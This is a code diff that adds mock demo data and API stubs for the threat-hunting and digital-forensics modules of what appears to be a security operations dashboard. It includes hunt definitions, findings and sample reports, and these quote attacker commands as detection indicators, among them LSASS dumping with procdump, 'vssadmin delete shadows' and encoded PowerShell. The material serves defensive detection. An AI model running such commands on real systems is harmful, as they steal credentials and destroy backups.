@@ -425,6 +425,38 @@ const HUNT_TEMPLATES_NORMALIZED = D.hunt_templates.map((t: any) => ({
   created_by:  t.created_by  ?? 'XCloak',
 }));
 
+// ── Threat Hunt Enterprise demo data ─────────────────────────────────────────
+
+const THREAT_HUNT_LIBRARY: any[] = [
+  { id: 1, name: 'PowerShell Encoded Command Hunt',       category: 'ttp',    sub_category: 'powershell',     author: 'analyst-1', priority: 'high',     status: 'active',    risk_level: 'high',     mitre_techniques: 'T1059.001', hypothesis: 'An attacker may have used PowerShell with encoded commands after phishing to establish persistence.', objective: 'Find encoded PowerShell invocations across all endpoints', expected_findings: 'powershell.exe -EncodedCommand events', success_criteria: 'Identify hosts with encoded PS execution not tied to legitimate software', scope: 'endpoints,servers', query_type: 'process', query_text: 'powershell', schedule_type: 'daily', cron_schedule: '0 6 * * *', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-1', review_status: 'approved', hit_count: 14, run_count: 8, success_count: 6, false_positive_count: 2, success_rate: 75, last_run_at: new Date(Date.now() - 3600000).toISOString(), version: 3, created_at: new Date(Date.now() - 86400000 * 7).toISOString() },
+  { id: 2, name: 'APT29 Phishing Infrastructure Hunt',   category: 'actor',  sub_category: 'apt29',          author: 'analyst-2', priority: 'critical', status: 'active',    risk_level: 'critical', mitre_techniques: 'T1566,T1071.001,T1059.001', hypothesis: 'APT29 may be using phishing domains for initial access against our external-facing users.', objective: 'Identify connections to known APT29 C2 infrastructure', expected_findings: 'DNS queries and HTTP connections to APT29 domains', success_criteria: 'Find hosts connecting to indicators from APT29 campaign reports', scope: 'endpoints,network,cloud', query_type: 'connection', query_text: 'beacon', schedule_type: 'weekly', cron_schedule: '0 8 * * 1', is_continuous: true, continuous_interval: '4h', assigned_analyst: 'analyst-2', review_status: 'approved', hit_count: 3, run_count: 4, success_count: 2, false_positive_count: 1, success_rate: 50, last_run_at: new Date(Date.now() - 7200000).toISOString(), version: 2, created_at: new Date(Date.now() - 86400000 * 14).toISOString() },
+  { id: 3, name: 'LSASS Memory Dumping Detection',       category: 'ttp',    sub_category: 'lsass',          author: 'analyst-1', priority: 'critical', status: 'active',    risk_level: 'critical', mitre_techniques: 'T1003.001', hypothesis: 'Attackers may be dumping LSASS to harvest credentials post-compromise.', objective: 'Find LSASS memory access events indicative of credential dumping', expected_findings: 'procdump.exe or comsvcs.dll MiniDump access to lsass.exe', success_criteria: 'Alert on any unauthorized LSASS handle requests', scope: 'endpoints,servers', query_type: 'process', query_text: 'lsass', schedule_type: 'continuous', cron_schedule: '', is_continuous: true, continuous_interval: '1h', assigned_analyst: 'analyst-1', review_status: 'approved', hit_count: 2, run_count: 12, success_count: 2, false_positive_count: 0, success_rate: 100, last_run_at: new Date(Date.now() - 1800000).toISOString(), version: 4, created_at: new Date(Date.now() - 86400000 * 21).toISOString() },
+  { id: 4, name: 'Cobalt Strike Beacon Hunt',            category: 'malware', sub_category: 'cobalt_strike', author: 'analyst-3', priority: 'critical', status: 'active',    risk_level: 'critical', mitre_techniques: 'T1071.001,T1573,T1055', hypothesis: 'Cobalt Strike beacons may be present in the environment based on threat intel feeds.', objective: 'Identify Cobalt Strike C2 communication patterns', expected_findings: 'Periodic beaconing to known Cobalt Strike domains, JA3 fingerprint matches', success_criteria: 'Find hosts with beacon sleep patterns and encrypted C2 comms', scope: 'endpoints,network', query_type: 'connection', query_text: 'beacon', schedule_type: 'daily', cron_schedule: '0 */4 * * *', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-3', review_status: 'approved', hit_count: 5, run_count: 6, success_count: 4, false_positive_count: 1, success_rate: 66.7, last_run_at: new Date(Date.now() - 5400000).toISOString(), version: 2, created_at: new Date(Date.now() - 86400000 * 5).toISOString() },
+  { id: 5, name: 'AWS IAM Privilege Escalation Hunt',    category: 'cloud',  sub_category: 'aws_iam',        author: 'analyst-2', priority: 'high',     status: 'active',    risk_level: 'high',     mitre_techniques: 'T1078,T1548', hypothesis: 'An insider or compromised identity may be abusing IAM roles to escalate privileges.', objective: 'Detect unusual IAM role assumption and policy modification', expected_findings: 'CreatePolicy, AttachRolePolicy events from unexpected sources', success_criteria: 'Identify any non-approved IAM changes in the last 30 days', scope: 'cloud', query_type: 'log', query_text: 'iam', schedule_type: 'daily', cron_schedule: '0 9 * * *', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-2', review_status: 'pending', hit_count: 7, run_count: 5, success_count: 3, false_positive_count: 4, success_rate: 60, last_run_at: new Date(Date.now() - 9000000).toISOString(), version: 1, created_at: new Date(Date.now() - 86400000 * 3).toISOString() },
+  { id: 6, name: 'Data Exfiltration via DNS Tunneling', category: 'insider', sub_category: 'data_exfil',    author: 'analyst-1', priority: 'high',     status: 'completed', risk_level: 'high',     mitre_techniques: 'T1048.003', hypothesis: 'An insider threat actor may be exfiltrating data via DNS tunneling to evade DLP.', objective: 'Detect anomalous DNS query volumes and long TXT/NULL record queries', expected_findings: 'DNS queries with >50 chars subdomain, high volume to single domain', success_criteria: 'Find hosts with DNS tunneling indicators not tied to legitimate tools', scope: 'endpoints,network,dns', query_type: 'connection', query_text: 'dns', schedule_type: 'manual', cron_schedule: '', is_continuous: false, continuous_interval: '', assigned_analyst: 'analyst-3', review_status: 'approved', hit_count: 1, run_count: 3, success_count: 1, false_positive_count: 2, success_rate: 33.3, last_run_at: new Date(Date.now() - 86400000 * 2).toISOString(), version: 2, created_at: new Date(Date.now() - 86400000 * 10).toISOString() },
+  { id: 7, name: 'Lateral Movement via SMB Shares',     category: 'ttp',    sub_category: 'lateral',        author: 'analyst-2', priority: 'high',     status: 'active',    risk_level: 'high',     mitre_techniques: 'T1021.002,T1550', hypothesis: 'Post-compromise lateral movement may be occurring via admin SMB shares with stolen credentials.', objective: 'Detect admin share access patterns inconsistent with normal IT operations', expected_findings: 'Authentication events to C$, ADMIN$ from unexpected source hosts', success_criteria: 'Identify source hosts accessing >3 unique admin shares in <1h', scope: 'endpoints,servers,active_directory', query_type: 'alert', query_text: 'smb', schedule_type: 'continuous', cron_schedule: '', is_continuous: true, continuous_interval: '2h', assigned_analyst: 'analyst-1', review_status: 'approved', hit_count: 8, run_count: 10, success_count: 7, false_positive_count: 1, success_rate: 70, last_run_at: new Date(Date.now() - 3600000 * 2).toISOString(), version: 5, created_at: new Date(Date.now() - 86400000 * 30).toISOString() },
+  { id: 8, name: 'Ransomware Pre-Stage Hunt',           category: 'malware', sub_category: 'ransomware_family', author: 'analyst-3', priority: 'critical', status: 'active', risk_level: 'critical', mitre_techniques: 'T1486,T1490,T1489', hypothesis: 'A ransomware operator may be staging for deployment — shadow copy deletion and network drive enumeration are indicators.', objective: 'Detect pre-ransomware staging activities', expected_findings: 'vssadmin delete shadows, net use, taskkill /f service kills', success_criteria: 'Alert on any VSS deletion or shadow inhibition events', scope: 'endpoints,servers', query_type: 'log', query_text: 'vssadmin', schedule_type: 'continuous', cron_schedule: '', is_continuous: true, continuous_interval: '30m', assigned_analyst: 'analyst-2', review_status: 'approved', hit_count: 0, run_count: 15, success_count: 0, false_positive_count: 0, success_rate: 0, last_run_at: new Date(Date.now() - 1800000).toISOString(), version: 3, created_at: new Date(Date.now() - 86400000 * 45).toISOString() },
+];
+
+const THREAT_HUNT_FINDINGS_DATA: any[] = [
+  { id: 1, hunt_id: 1, hunt_name: 'PowerShell Encoded Command Hunt', severity: 'high',     confidence: 'high',   risk: 'high',   title: 'Encoded PowerShell on WORKSTATION-01', description: 'powershell.exe -EncodedCommand SQBFAFgAIA...', mitre_technique: 'T1059.001', affected_host: 'WORKSTATION-01', affected_user: 'jdoe', ioc_value: 'powershell -enc', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() },
+  { id: 2, hunt_id: 3, hunt_name: 'LSASS Memory Dumping Detection', severity: 'critical', confidence: 'high',   risk: 'critical', title: 'LSASS Dumped via procdump on SRV-02', description: 'procdump64.exe -ma lsass.exe dump.dmp detected', mitre_technique: 'T1003.001', affected_host: 'SRV-02', affected_user: 'SYSTEM', ioc_value: 'procdump', status: 'confirmed', created_at: new Date(Date.now() - 7200000).toISOString() },
+  { id: 3, hunt_id: 4, hunt_name: 'Cobalt Strike Beacon Hunt', severity: 'critical', confidence: 'medium', risk: 'critical', title: 'Beacon sleep pattern on WORKSTATION-04', description: 'Regular 60s HTTP POST to non-standard port, fixed payload size', mitre_technique: 'T1071.001', affected_host: 'WORKSTATION-04', affected_user: 'bsmith', ioc_value: '185.220.101.47', status: 'open', created_at: new Date(Date.now() - 5400000).toISOString() },
+  { id: 4, hunt_id: 2, hunt_name: 'APT29 Phishing Infrastructure Hunt', severity: 'high', confidence: 'medium', risk: 'high', title: 'APT29-linked domain access from LAP-012', description: 'DNS query to known APT29 phishing domain detected', mitre_technique: 'T1566', affected_host: 'LAP-012', affected_user: 'mwilson', ioc_value: 'cozy-update.net', status: 'acknowledged', created_at: new Date(Date.now() - 9000000).toISOString() },
+  { id: 5, hunt_id: 7, hunt_name: 'Lateral Movement via SMB Shares', severity: 'high', confidence: 'high', risk: 'high', title: 'Admin share access sweep from SRV-01', description: 'SRV-01 accessed ADMIN$ on 6 hosts within 10 minutes', mitre_technique: 'T1021.002', affected_host: 'SRV-01', affected_user: 'svc_backup', ioc_value: '\\\\*\\ADMIN$', status: 'open', created_at: new Date(Date.now() - 10800000).toISOString() },
+];
+
+const THREAT_HUNT_CATEGORIES_DATA = {
+  categories: [
+    { key: 'ioc', label: 'IOC Hunts', icon: '🎯', total_count: 2, sub_categories: [{key:'ip',label:'IP Address',count:1},{key:'domain',label:'Domain',count:1},{key:'url',label:'URL',count:0},{key:'sha256',label:'SHA-256',count:0},{key:'md5',label:'MD5',count:0},{key:'email',label:'Email',count:0},{key:'ja3',label:'JA3',count:0},{key:'certificate',label:'Certificate',count:0}] },
+    { key: 'ttp', label: 'TTP Hunts', icon: '⚔️', total_count: 3, sub_categories: [{key:'powershell',label:'PowerShell',count:1},{key:'persistence',label:'Persistence',count:0},{key:'injection',label:'Process Injection',count:0},{key:'lsass',label:'Credential Dumping',count:1},{key:'beaconing',label:'C2 Beaconing',count:0},{key:'lateral',label:'Lateral Movement',count:1},{key:'ransomware',label:'Ransomware',count:0}] },
+    { key: 'actor', label: 'Threat Actor Hunts', icon: '🕵️', total_count: 1, sub_categories: [{key:'apt29',label:'APT29',count:1},{key:'fin7',label:'FIN7',count:0},{key:'lazarus',label:'Lazarus',count:0},{key:'scattered_spider',label:'Scattered Spider',count:0},{key:'custom',label:'Custom',count:0}] },
+    { key: 'malware', label: 'Malware Hunts', icon: '🦠', total_count: 2, sub_categories: [{key:'cobalt_strike',label:'Cobalt Strike',count:1},{key:'sliver',label:'Sliver',count:0},{key:'mimikatz',label:'Mimikatz',count:0},{key:'emotet',label:'Emotet',count:0},{key:'ransomware_family',label:'Ransomware Families',count:1}] },
+    { key: 'cloud', label: 'Cloud Hunts', icon: '☁️', total_count: 1, sub_categories: [{key:'aws_iam',label:'AWS IAM',count:1},{key:'azure_rbac',label:'Azure RBAC',count:0},{key:'public_storage',label:'Public Storage',count:0},{key:'k8s_privesc',label:'K8s PrivEsc',count:0}] },
+    { key: 'insider', label: 'Insider Hunts', icon: '🔍', total_count: 1, sub_categories: [{key:'usb_copy',label:'USB Copy',count:0},{key:'data_exfil',label:'Data Exfiltration',count:1},{key:'source_theft',label:'Source Code Theft',count:0},{key:'privilege_abuse',label:'Privilege Abuse',count:0}] },
+  ],
+};
+
 // VulnQueueItem[] built from vulnerabilities
 const VULN_QUEUE_ITEMS = D.vulnerabilities.map((v: any, i: number) => {
   const ag = D.agents.find((a: any) => a.id === v.agent_id);
@@ -1330,6 +1362,18 @@ export function demoRoute(
   // WebSocket ticket — fake it so the WS flow doesn't show a 403 toast
   if (p === '/ws/ticket') return ok({ ticket: 'demo-ws-ticket-noop' });
 
+  // ── Threat Hunt Enterprise POST stubs ────────────────────────────────────────
+  if (method === 'POST' && p === '/threat-hunt')            return ok({ id: Date.now() % 1000 + 100 });
+  if (method === 'POST' && p === '/threat-hunt/ai')         return ok({ suggestions: [{ name: 'Living-off-the-Land Binaries Hunt', category: 'ttp', hypothesis: 'Attackers may be abusing trusted Windows binaries to execute malicious code.', query_type: 'process', query_text: 'wmic.exe certutil.exe', mitre_techniques: 'T1218', priority: 'high' }], improved_hypothesis: 'An attacker with initial access may use encoded PowerShell commands to download and execute additional payloads while evading signature-based detection.', objective: 'Identify PowerShell execution with base64-encoded commands', expected_findings: 'powershell.exe with -EncodedCommand or -enc flags', success_criteria: 'Find >0 encoded PS invocations not tied to approved scripts', kql_query: 'process_name:"powershell.exe" AND cmdline:(*EncodedCommand* OR *-enc*)', executive_summary: 'Hunt analysis complete. 3 high-confidence indicators of compromise identified across 2 hosts.', key_findings: ['WORKSTATION-01: Encoded PS execution at 14:23', 'SRV-02: LSASS access by non-system process'], recommended_actions: ['Isolate WORKSTATION-01 for forensics', 'Review all PowerShell event logs'], next_hunts: [{ name: 'Follow-up: Persistence via Registry Run Keys', rationale: 'PS execution often followed by persistence', priority: 'high', mitre_technique: 'T1547.001', category: 'ttp' }] });
+  if (method === 'POST' && p === '/threat-hunt/export')     return ok({ id: 1, name: 'Demo Hunt', category: 'ttp', mitre_techniques: 'T1059.001', hypothesis: 'Demo hypothesis', query_text: 'powershell', hit_count: 14, run_count: 8 });
+  if (method === 'POST' && p === '/threat-hunt/response')   return ok({ queued: true, action: 'open_incident', target: 'WORKSTATION-01', message: "Response action 'open_incident' queued for target 'WORKSTATION-01'" });
+  if (method === 'POST' && p.match(/^\/threat-hunt\/\d+\/execute$/))  return ok({ hunt_id: 1, hunt_name: 'Demo Hunt', hits: 3, status: 'completed' });
+  if (method === 'POST' && p.match(/^\/threat-hunt\/\d+\/schedule$/)) return ok({ ok: true });
+  if (method === 'POST' && p.match(/^\/threat-hunt\/\d+\/comment$/))  return ok({ id: Date.now() });
+  if (method === 'PATCH' && p.match(/^\/threat-hunt\/\d+$/))          return ok({ ok: true });
+  if (method === 'DELETE' && p.match(/^\/threat-hunt\/\d+$/))         return ok({ ok: true });
+  if (method === 'POST' && p.match(/^\/threat-hunt\/findings\/\d+\/ack$/)) return ok({ ok: true });
+
   // ── Hunt enterprise POST stubs (search/analysis — no state mutation) ────────
   if (method === 'POST' && p === '/hunt/ai')       return ok({ kql: 'source="endpoint" | where process_name contains "powershell"', explanation: 'Searches for PowerShell execution across all endpoints.', alternative_queries: ['event_type="process_creation" | where parent_process_name contains "office"'], recommended_actions: ['Investigate flagged hosts', 'Cross-reference with YARA matches'], sigma_rule: 'title: PowerShell Execution\nstatus: experimental\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: powershell.exe\n  condition: selection', summary: 'Hunt completed. 3 high-confidence PowerShell-based C2 indicators found across 2 hosts.' });
   if (method === 'POST' && p === '/hunt/ioc')      return ok({ ioc_type: 'ip', value: '185.220.101.47', time_range: '24h', log_hits: [{ source: 'syslog', hostname: 'srv-02', message: 'Connection to 185.220.101.47:443 established', timestamp: new Date().toISOString(), agent_id: 1 }], alert_hits: [{ rule_name: 'C2 Communication Detected', hostname: 'srv-02', severity: 'critical', timestamp: new Date().toISOString() }], conn_hits: [{ hostname: 'srv-02', remote_addr: '185.220.101.47:443', state: 'ESTABLISHED', timestamp: new Date().toISOString() }], total_hits: 3 });
@@ -1339,6 +1383,33 @@ export function demoRoute(
   if (method === 'POST' && p === '/hunt/notebook') return ok({ id: Date.now() });
   if (method === 'DELETE' && p.startsWith('/hunt/notebook/')) return ok({ ok: true });
   if (method === 'POST' && p === '/hunt/response') return ok({ queued: true, action: 'isolate_host', target: 'WORKSTATION-01', message: "Response action 'isolate_host' queued for target 'WORKSTATION-01'" });
+
+  // ── DFIR Enterprise — mutation stubs ──────────────────────────────────────
+  if (method === 'POST' && p === '/dfir/investigations')   return ok({ id: 101, investigation_id: 'INV-9999-00101' });
+  if (method === 'PATCH' && /^\/dfir\/investigations\/\d+$/.test(p))   return ok({ ok: true });
+  if (method === 'DELETE' && /^\/dfir\/investigations\/\d+$/.test(p))  return ok({ ok: true });
+  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/collect$/.test(p))
+    return ok({ task_id: 1, evidence_count: 4, evidence_ids: [1, 2, 3, 4], host: 'WORKSTATION-01', artifacts: ['processes', 'connections', 'event_logs', 'file_hashes'] });
+  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/ai$/.test(p))
+    return ok({ executive_summary: 'Malicious PowerShell execution was detected originating from a phishing email attachment. The attacker established persistence via a scheduled task and moved laterally using SMB.', attack_chain: ['Phishing Email', 'Macro Execution', 'PowerShell Download Cradle', 'C2 Beacon', 'Lateral Movement', 'Data Staging'], root_cause: 'User opened a malicious Office macro document delivered via spearphishing email.', impact: 'Data exfiltration of ~2GB from finance share. Two hosts compromised.', recommendations: ['Block macro execution via Group Policy', 'Enable Attack Surface Reduction rules', 'Enforce MFA on all accounts', 'Review SMB share permissions'], next_steps: ['Isolate WORKSTATION-01', 'Reset credentials for affected users', 'Review email gateway logs', 'Run threat hunt for similar macros'] });
+  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/report$/.test(p))
+    return ok({ report_type: 'dfir', title: 'DFIR Investigation Report', classification: 'TLP:GREEN', executive_summary: 'A targeted intrusion was detected affecting two Windows endpoints. Root cause was a malicious macro document delivered via email. The attacker established C2 via HTTPS beaconing and moved laterally using stolen credentials.', incident_overview: 'On 2026-07-10 at 08:14 UTC, SOC analysts detected anomalous PowerShell activity on WORKSTATION-01 following a phishing campaign. Investigation determined that the user had opened a malicious macro-enabled document.', timeline_summary: 'T+0 Phishing email received → T+4m Document opened → T+5m PowerShell executes → T+6m Registry persistence set → T+8m SMB lateral movement → T+22m Data exfiltration begins', technical_analysis: 'The PowerShell payload used AMSI bypass techniques and loaded a reflective DLL into memory. C2 communication was established over HTTPS to a domain registered 2 days prior to the attack.', evidence_summary: '12 evidence items collected across 2 hosts including memory dumps, network captures, and file system artifacts.', ioc_list: ['185.220.101.47', 'update-cdn-service[.]com', 'SHA256:e3b0c44298fc1c149afb...'], mitre_coverage: ['T1566.001', 'T1059.001', 'T1547.001', 'T1021.002', 'T1041'], impact_assessment: 'Medium business impact. Finance share accessed. No PII confirmed exfiltrated.', containment_steps: ['Isolated affected hosts', 'Blocked C2 IPs at firewall', 'Disabled compromised user accounts'], eradication_steps: ['Removed malicious scheduled task', 'Cleaned registry run keys', 'Reimaged WORKSTATION-01'], recovery_steps: ['Restored from clean backup', 'Reset all affected credentials', 'Applied patch KB5034441'], lessons_learned: ['Enforce macro execution policy via GPO', 'Improve phishing simulation coverage', 'Reduce alert-to-triage time from 45m to <15m'] });
+  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/response$/.test(p))
+    return ok({ ok: true, queued: true, action: 'isolate_host', target: 'WORKSTATION-01', message: "Response action queued" });
+  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/timeline$/.test(p))
+    return ok({ id: Date.now() % 10000 });
+  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/memory$/.test(p))
+    return ok({ suspicious_processes: [{ name: 'svchost.exe', reason: 'Running from Temp directory, not System32', severity: 'critical', mitre: 'T1055' }, { name: 'rundll32.exe', reason: 'Unusual parent process: winword.exe', severity: 'high', mitre: 'T1218.011' }], injections: [{ process: 'notepad.exe', pid: 4812, indicator: 'Shellcode injected via VirtualAllocEx', confidence: 88 }], recommendations: ['Dump memory of svchost.exe (PID 4321)', 'Analyze rundll32.exe loaded DLLs', 'Check for LSASS access events'], executive_summary: 'Memory analysis identified 2 suspicious processes consistent with post-exploitation tooling. Code injection detected in notepad.exe.' });
+  if (method === 'POST' && /^\/dfir\/investigations\/\d+\/notebook$/.test(p))
+    return ok({ id: Date.now() % 10000 });
+  if (method === 'DELETE' && /^\/dfir\/notebook\/\d+$/.test(p))
+    return ok({ ok: true });
+  if (method === 'POST' && /^\/dfir\/evidence\/\d+\/custody$/.test(p))
+    return ok({ id: Date.now() % 10000 });
+  if (method === 'POST' && p === '/dfir/file-analysis')
+    return ok({ file_name: 'invoice_macro.xlsm', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', md5: 'd41d8cd98f00b204e9800998ecf8427e', entropy: 6.84, file_type: 'Microsoft Excel Macro', is_pe: false, is_signed: false, packed: false, suspicious: true, threat_classification: 'Trojan.Macro.Agent', strings_of_interest: ['powershell -enc', 'cmd.exe /c', 'WScript.Shell', 'http://'], imports: [], exports: [], sections: [], mitre_techniques: ['T1566.001', 'T1059.001'], iocs: ['powershell -enc SQBFAFgA'], verdict: 'malicious', confidence: 94, recommendations: ['Block execution on all endpoints', 'Search for similar files via SHA256', 'Alert on WScript.Shell parent spawning PowerShell'] });
+  if (method === 'POST' && p === '/dfir/malware-analysis')
+    return ok({ hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', threat_name: 'Cobalt Strike Beacon', threat_family: 'CobaltStrike', threat_category: 'RAT/C2 Framework', confidence: 97, sandbox_verdict: 'malicious', yara_matches: [{ rule: 'HKTL_CobaltStrike_Beacon_Strings', tags: ['apt', 'c2'], description: 'Detects CobaltStrike beacon configuration strings' }], strings: ['ReflectiveDll', 'VirtualAllocEx', 'CreateRemoteThread', 'MSFEEDSSYNC'], imports: ['VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread', 'LoadLibraryA'], packer: 'UPX 3.91', c2_domains: ['update-cdn-service.com', 'cdn-assets-global.net'], c2_ips: ['185.220.101.47', '104.21.84.133'], capabilities: ['Process injection', 'Keylogging', 'Screenshot capture', 'Lateral movement'], persistence: ['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'], evasion: ['AMSI bypass', 'ETW patching', 'Sleep obfuscation'], mitre_techniques: [{ id: 'T1055', name: 'Process Injection', tactic: 'Defense Evasion' }, { id: 'T1071.001', name: 'Web Protocols', tactic: 'C2' }], threat_actors: ['APT29', 'FIN7'], campaigns: ['DarkSide Affiliate', 'Operation NightScout'], cves: [], vt_detections: 62, vt_total: 70, misp_events: [], recommendations: ['Block C2 domains at firewall', 'Hunt for beacon traffic on port 443', 'Search for UPX-packed binaries in Temp directories'], executive_summary: 'CobaltStrike beacon detected with high confidence (97%). Active C2 communication identified to known malicious infrastructure.' });
 
   // All mutations → 403
   if (!['GET', 'HEAD'].includes(method.toUpperCase())) return demoBlock();
@@ -1840,6 +1911,53 @@ export function demoRoute(
   }
   if (p === '/hunt/notebook')                 return ok([{ id: 1, run_id: 0, content: '## Hunt Notes\n\nInvestigating C2 beaconing pattern on WORKSTATION-01.', content_type: 'note', created_by: 'analyst-1', created_at: new Date().toISOString() }]);
 
+  // ── Threat Hunt Enterprise GET stubs ─────────────────────────────────────────
+  if (p === '/threat-hunt/dashboard') {
+    const lib = THREAT_HUNT_LIBRARY;
+    return ok({
+      total: lib.length, draft: 0, active: lib.filter(h => h.status === 'active').length,
+      completed: lib.filter(h => h.status === 'completed').length, archived: 0,
+      scheduled: lib.filter(h => h.schedule_type !== 'manual' && h.schedule_type !== '').length,
+      continuous: lib.filter(h => h.is_continuous).length,
+      ioc_hunts: lib.filter(h => h.category === 'ioc').length,
+      ttp_hunts: lib.filter(h => h.category === 'ttp').length,
+      actor_hunts: lib.filter(h => h.category === 'actor').length,
+      total_runs: lib.reduce((s, h) => s + h.run_count, 0),
+      success_rate: Math.round(lib.reduce((s, h) => s + h.success_rate, 0) / lib.length),
+      findings: THREAT_HUNT_FINDINGS_DATA.length,
+      new_findings: THREAT_HUNT_FINDINGS_DATA.filter(f => f.status === 'open').length,
+      critical_finds: THREAT_HUNT_FINDINGS_DATA.filter(f => f.severity === 'critical').length,
+      high_finds: THREAT_HUNT_FINDINGS_DATA.filter(f => f.severity === 'high').length,
+      open_findings: THREAT_HUNT_FINDINGS_DATA.filter(f => f.status === 'open').length,
+      recent: lib.slice(0, 6).map(h => ({ id: h.id, name: h.name, category: h.category, status: h.status, hit_count: h.hit_count, run_at: h.last_run_at })),
+      trend: Array.from({ length: 14 }, (_, i) => ({ date: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10), hunts: seededRand(i * 7) % 3, findings: seededRand(i * 11) % 5 })),
+    });
+  }
+  if (p === '/threat-hunt/library')    return ok(THREAT_HUNT_LIBRARY);
+  if (p === '/threat-hunt/categories') return ok(THREAT_HUNT_CATEGORIES_DATA);
+  if (p === '/threat-hunt/findings')   return ok(THREAT_HUNT_FINDINGS_DATA);
+  if (p === '/threat-hunt/metrics') return ok({
+    by_category: [
+      { category: 'ttp',    total: 3, total_hits: 24, success_rate: 73 },
+      { category: 'malware',total: 2, total_hits: 5,  success_rate: 66 },
+      { category: 'actor',  total: 1, total_hits: 3,  success_rate: 50 },
+      { category: 'cloud',  total: 1, total_hits: 7,  success_rate: 60 },
+      { category: 'insider',total: 1, total_hits: 1,  success_rate: 33 },
+    ],
+    by_analyst: [
+      { analyst: 'analyst-1', hunt_count: 4, total_hits: 24, success_rate: 75 },
+      { analyst: 'analyst-2', hunt_count: 3, total_hits: 10, success_rate: 55 },
+      { analyst: 'analyst-3', hunt_count: 2, total_hits: 5,  success_rate: 60 },
+    ],
+    daily: Array.from({ length: 14 }, (_, i) => ({ date: new Date(Date.now() - (13 - i) * 86400000).toISOString().slice(0, 10), hunts: seededRand(i * 5) % 3, findings: seededRand(i * 9) % 4 })),
+  });
+  if (/^\/threat-hunt\/\d+\/comments$/.test(p)) return ok([{ id: 1, author: 'analyst-1', content: 'Confirmed malicious activity on WORKSTATION-01. Escalating to incident response.', created_at: new Date(Date.now() - 3600000).toISOString() }]);
+  if (/^\/threat-hunt\/\d+$/.test(p)) {
+    const hid = parseInt(p.split('/').pop() || '0');
+    const found = THREAT_HUNT_LIBRARY.find(h => h.id === hid);
+    return found ? ok(found) : notFound();
+  }
+
   // ── Hunt — templates with schedule/created_by ─────────────────────────────
   if (p === '/hunt/templates') return ok(HUNT_TEMPLATES_NORMALIZED);
   if (p === '/hunt/runs')      return ok(D.hunt_runs);
@@ -1960,6 +2078,144 @@ export function demoRoute(
   if (p === '/itdr/findings')     return ok({ findings: D.itdr_findings, total: D.itdr_findings.length });
   if (p === '/dfir/collections')  return ok(DFIR_COLLECTIONS);
   if (/^\/dfir\/collections\/\d+\/timeline$/.test(p)) return ok([]);
+
+  // ── DFIR Enterprise GET stubs ─────────────────────────────────────────────
+  if (p === '/dfir/dashboard') return ok({
+    stats: { total: 12, open: 5, in_progress: 3, closed: 4, high_priority: 4, evidence_items: 47, memory_dumps: 3, disk_images: 1, open_cases: 8, custody_ok: 41, custody_pending: 6 },
+    recent: [
+      { id: 101, title: 'Spearphishing → CobaltStrike Beacon', priority: 'critical', status: 'in_progress', analyst: 'analyst-1', created_at: new Date(Date.now() - 3600000).toISOString() },
+      { id: 102, title: 'Insider Data Exfiltration via USB', priority: 'high', status: 'open', analyst: 'analyst-2', created_at: new Date(Date.now() - 7200000).toISOString() },
+      { id: 103, title: 'Ransomware Pre-Staging Detection', priority: 'critical', status: 'open', analyst: 'analyst-1', created_at: new Date(Date.now() - 86400000).toISOString() },
+      { id: 104, title: 'Kerberoasting via Service Accounts', priority: 'high', status: 'in_progress', analyst: 'analyst-3', created_at: new Date(Date.now() - 172800000).toISOString() },
+      { id: 105, title: 'Unauthorized Cloud IAM Backdoor', priority: 'high', status: 'closed', analyst: 'analyst-2', created_at: new Date(Date.now() - 259200000).toISOString() },
+    ],
+  });
+  if (p === '/dfir/investigations' || p.startsWith('/dfir/investigations?')) return ok([
+    { id: 101, investigation_id: 'INV-9999-00101', case_id: 'CASE-2026-0042', title: 'Spearphishing → CobaltStrike Beacon', analyst: 'analyst-1', priority: 'critical', status: 'in_progress', tags: 'phishing,cobalt-strike,c2', target_hosts: 'WORKSTATION-01,SERVER-DC01', mitre_techniques: 'T1566.001,T1059.001,T1071.001,T1021.002', version: 3, evidence_count: 12, created_at: new Date(Date.now() - 3600000).toISOString(), updated_at: new Date(Date.now() - 1800000).toISOString() },
+    { id: 102, investigation_id: 'INV-9999-00102', case_id: 'CASE-2026-0043', title: 'Insider Data Exfiltration via USB', analyst: 'analyst-2', priority: 'high', status: 'open', tags: 'insider,usb,exfil', target_hosts: 'LAPTOP-HR-03', mitre_techniques: 'T1052.001,T1005', version: 1, evidence_count: 4, created_at: new Date(Date.now() - 7200000).toISOString(), updated_at: new Date(Date.now() - 7200000).toISOString() },
+    { id: 103, investigation_id: 'INV-9999-00103', case_id: 'CASE-2026-0040', title: 'Ransomware Pre-Staging Detection', analyst: 'analyst-1', priority: 'critical', status: 'open', tags: 'ransomware,vss,pre-staging', target_hosts: 'FILE-SERVER-01,BACKUP-01', mitre_techniques: 'T1486,T1490,T1489', version: 2, evidence_count: 8, created_at: new Date(Date.now() - 86400000).toISOString(), updated_at: new Date(Date.now() - 43200000).toISOString() },
+    { id: 104, investigation_id: 'INV-9999-00104', case_id: 'CASE-2026-0039', title: 'Kerberoasting via Service Accounts', analyst: 'analyst-3', priority: 'high', status: 'in_progress', tags: 'kerberos,credential,ad', target_hosts: 'SERVER-DC01', mitre_techniques: 'T1558.003', version: 1, evidence_count: 3, created_at: new Date(Date.now() - 172800000).toISOString(), updated_at: new Date(Date.now() - 86400000).toISOString() },
+    { id: 105, investigation_id: 'INV-9999-00105', case_id: 'CASE-2026-0035', title: 'Unauthorized Cloud IAM Backdoor', analyst: 'analyst-2', priority: 'high', status: 'closed', tags: 'cloud,iam,persistence', target_hosts: 'aws-prod-01', mitre_techniques: 'T1078,T1136', version: 4, evidence_count: 20, created_at: new Date(Date.now() - 259200000).toISOString(), updated_at: new Date(Date.now() - 172800000).toISOString() },
+  ]);
